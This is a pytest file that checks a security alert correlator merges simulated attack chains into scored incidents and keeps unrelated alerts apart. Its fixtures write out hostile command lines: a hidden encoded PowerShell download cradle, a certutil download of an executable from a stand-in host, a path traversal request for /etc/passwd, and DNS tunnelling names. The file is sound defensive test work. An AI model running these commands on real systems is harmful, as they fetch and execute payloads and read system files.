"""Correlation: attack chains become one scored incident; unrelated alerts stay apart."""

from datetime import timedelta

import pytest
from sqlmodel import Session, col, select
from tests.test_detection import MON_2AM, Harness, dns, ev, failures, web, win_proc

from app.correlation.correlator import Correlator, score_incident
from app.services import settings as settings_service
from app.storage.models import Alert, Incident, Outcome


@pytest.fixture
def h(db: Session) -> Harness:
    harness = Harness(db)
    correlator = Correlator(harness.engine)

    def hook(d: Session, ids: list[int]) -> None:
        correlator.on_alerts(d, ids)

    harness.engine.alert_hooks.append(hook)
    return harness


def incidents(db: Session) -> list[Incident]:
    db.expire_all()
    return list(db.exec(select(Incident).order_by(col(Incident.id))))


def linux_chain(h: Harness) -> None:
    """SSH brute force → success → sudo → new user → added to sudo, at 2am on web01."""
    t = MON_2AM
    h.ingest(failures(12, t))
    h.ingest(
        [
            ev(
                t + timedelta(minutes=3),
                action="ssh_login",
                outcome=Outcome.success,
                src_ip="203.0.113.50",
                user="deploy",
            )
        ]
    )
    h.ingest(
        [
            ev(
                t + timedelta(minutes=5),
                action="sudo_command",
                outcome=Outcome.success,
                user="deploy",
                process_cmdline="/usr/sbin/useradd -m svc-backup",
            )
        ]
    )
    h.ingest(
        [
            ev(
                t + timedelta(minutes=5, seconds=1),
                action="user_created",
                outcome=Outcome.success,
                user="svc-backup",
            )
        ]
    )
    h.ingest(
        [
            ev(
                t + timedelta(minutes=6),
                action="group_member_added",
                user="svc-backup",
                outcome=Outcome.success,
                extra={"group": "sudo"},
                tags=["privileged_group"],
            )
        ]
    )


def test_linux_attack_chain_is_one_critical_incident(h: Harness, db: Session) -> None:
    linux_chain(h)
    [inc] = incidents(db)
    alerts = db.exec(select(Alert).where(Alert.incident_id == inc.id)).all()
    assert {a.rule_id for a in alerts} == {
        "sig-auth-brute-force",
        "sig-auth-success-after-brute-force",
        "sig-priv-off-hours",
        "sig-persist-new-account",
        "sig-persist-admin-group",
    }
    assert inc.severity == "critical"
    assert inc.score >= 80
    assert inc.alert_count == len(alerts)
    assert inc.tactics == [
        "credential-access",
        "initial-access",
        "privilege-escalation",
        "persistence",
    ]
    assert inc.title.startswith("web01")
    assert "Credential Access → Initial Access" in inc.title
    assert "203.0.113.50" in inc.entities["src_ip"]


def test_windows_phishing_chain_is_one_incident(h: Harness, db: Session) -> None:
    t = MON_2AM
    b64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
    h.ingest(
        [
            win_proc(
                t, "powershell.exe", f"powershell -nop -w hidden -enc {b64}", parent="winword.exe"
            )
        ]
    )
    h.ingest(
        [
            win_proc(
                t + timedelta(minutes=1),
                "certutil.exe",
                "certutil -urlcache -split -f http://203.0.113.80/a.txt a.exe",
            )
        ]
    )
    h.ingest(
        [
            ev(
                t + timedelta(minutes=4),
                source_type="windows_security",
                host="ws-07",
                action="user_created",
                outcome=Outcome.success,
                user="helpdesk2",
                extra={"subject_user": "jdoe"},
            )
        ]
    )
    h.ingest(
        [
            ev(
                t + timedelta(minutes=4, seconds=2),
                source_type="windows_security",
                host="ws-07",
                action="group_member_added",
                user="helpdesk2",
                outcome=Outcome.success,
                extra={"group": "Administrators"},
                tags=["privileged_group"],
            )
        ]
    )
    h.ingest(
        [
            ev(
                t + timedelta(minutes=9),
                source_type="windows_security",
                host="ws-07",
                action="log_cleared",
                outcome=Outcome.success,
                user="jdoe",
                event_code="1102",
            )
        ]
    )
    [inc] = incidents(db)
    assert inc.severity == "critical"
    assert inc.tactics[0] == "execution"
    assert {"execution", "command-and-control", "persistence", "defense-impairment"} <= set(
        inc.tactics
    )
    assert inc.entities["host"] == ["ws-07"]


def test_unrelated_alerts_do_not_form_incidents(h: Harness, db: Session) -> None:
    # Single alerts with nothing in common: alerts, but no incident.
    h.ingest([ev(MON_2AM, host="db01", action="user_created", user="alice")])
    h.ingest(
        [
            ev(
                MON_2AM,
                host="ws-09",
                source_type="windows_security",
                action="log_cleared",
                user="bob",
                event_code="1102",
            )
        ]
    )
    assert incidents(db) == []


def test_alerts_far_apart_in_time_stay_separate(h: Harness, db: Session) -> None:
    h.ingest([ev(MON_2AM, action="user_created", user="svc-a")])
    h.ingest([ev(MON_2AM + timedelta(days=2), action="user_created", user="svc-b")])
    assert incidents(db) == []


def test_web_scans_do_not_merge_into_host_incidents(h: Harness, db: Session) -> None:
    linux_chain(h)
    h.ingest([web(MON_2AM + timedelta(minutes=2), "/../../etc/passwd", ip="198.51.100.66")])
    [inc] = incidents(db)
    web_alert = db.exec(select(Alert).where(Alert.rule_id == "sig-web-attack-patterns")).one()
    assert web_alert.incident_id is None
    assert inc.alert_count == 5


def test_exclusions_prevent_linking(h: Harness, db: Session) -> None:
    settings_service.put_detection(
        db, settings_service.DetectionSettings(correlation_exclusions=["jump01"])
    )
    h.ingest([ev(MON_2AM, host="jump01", action="user_created", user="a1")])
    h.ingest([ev(MON_2AM, host="jump01", action="user_created", user="a2")])
    assert incidents(db) == []


def test_bridging_alert_merges_incidents(h: Harness, db: Session) -> None:
    # Two pairs on different hosts form two incidents...
    h.ingest([ev(MON_2AM, host="srv-a", action="user_created", user="u1")])
    h.ingest([ev(MON_2AM, host="srv-a", action="log_cleared", user="x", event_code="1102")])
    h.ingest([ev(MON_2AM, host="srv-b", action="user_created", user="u2")])
    h.ingest([ev(MON_2AM, host="srv-b", action="log_cleared", user="y", event_code="1102")])
    assert len(incidents(db)) == 2
    # ...then one user active on both hosts ties them together.
    h.ingest([ev(MON_2AM, host="srv-a", action="sudo_command", outcome=Outcome.success, user="u2")])
    [inc] = incidents(db)
    assert inc.alert_count == 5
    assert set(inc.entities["host"]) == {"srv-a", "srv-b"}


def test_dns_alerts_link_on_host_only(h: Harness, db: Session) -> None:
    h.ingest([dns(MON_2AM + timedelta(seconds=i), f"{'z' * 45}{i}.tun.example") for i in range(12)])
    h.ingest([win_proc(MON_2AM, "certutil.exe", "certutil -decode a.b64 a.exe")])
    [inc] = incidents(db)
    assert inc.alert_count == 2


def test_scoring() -> None:
    lone, sev = score_incident(["medium"], ["persistence"])
    assert (lone, sev) == (25, "medium")
    chain, sev = score_incident(
        ["high", "high", "medium"], ["initial-access", "execution", "persistence"]
    )
    reverse, _ = score_incident(
        ["high", "high", "medium"], ["persistence", "execution", "initial-access"]
    )
    assert chain > reverse  # kill-chain order in time scores higher
    assert sev in ("high", "critical")
    capped, sev = score_incident(
        ["critical"] * 10,
        ["initial-access", "execution", "persistence", "privilege-escalation", "credential-access"],
    )
    assert capped == 100
    assert sev == "critical"
